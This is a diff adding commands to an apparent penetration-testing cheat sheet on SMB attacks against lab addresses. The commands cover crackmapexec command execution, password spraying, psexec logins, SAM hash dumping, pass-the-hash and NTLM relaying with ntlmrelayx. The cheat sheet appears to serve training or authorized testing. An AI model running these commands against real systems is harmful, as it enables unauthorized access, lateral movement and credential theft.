@@ -990,11 +990,20 @@ rpcclient -U'%' 10.10.110.17
 
 # Execute a command over the SMB service using crackmapexec.
 crackmapexec smb 10.10.110.17 -u Administrator -p 'Password123!' -x 'whoami' --exec-method smbexec
+crackmapexec smb 10.10.110.17 -u /tmp/userlist.txt -p 'Company01!' --local-auth
+impacket-psexec administrator:'Password123!'@10.10.110.17
+
+# Enumerating Logged-on Users
+crackmapexec smb 10.10.110.0/24 -u administrator -p 'Password123!' --loggedon-users
 
 # Extract hashes from the SAM database.
 crackmapexec smb 10.10.110.17 -u administrator -p 'Password123!' --sam
 
+# Pass-the-Hash (PtH) Techniqe
+crackmapexec smb 10.10.110.17 -u Administrator -H 2B576ACBE6BCFDA7294D6BD18041B8FE
+
 # Dump the SAM database using impacket-ntlmrelayx.
+cat /etc/responder/Responder.conf | grep 'SMB ='
 impacket-ntlmrelayx --no-http-server -smb2support -t 10.10.110.146
 
 # Execute a PowerShell based reverse shell using impacket-ntlmrelayx.
